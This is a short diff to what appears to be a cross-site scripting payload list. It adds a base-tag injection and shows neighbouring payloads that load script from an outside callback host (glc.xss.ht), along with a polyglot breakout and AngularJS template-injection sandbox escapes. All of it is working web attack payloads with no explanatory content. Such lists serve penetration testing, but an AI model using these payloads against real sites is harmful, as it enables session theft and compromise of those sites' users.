@@ -48,6 +48,7 @@ javascript://--></title></style></textarea></script><svg "//' onclick=confirm(1)
 '"><script src=glc.xss.ht>
 '"><SCriPT a=">" SRC="https://glc.xss.ht"></SCripT>
 '"><ScrIPT a=`>` SRC='https://glc.xss.ht'></SCRipT>
+?"></script><base%20c%3D=href%3Dhttps:\glc.xss.ht>
 {{constructor.constructor('prompt(1)')()}}
 {{0[a='constructor'][a]('prompt(1)')()}}
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=prompt(1)');}}
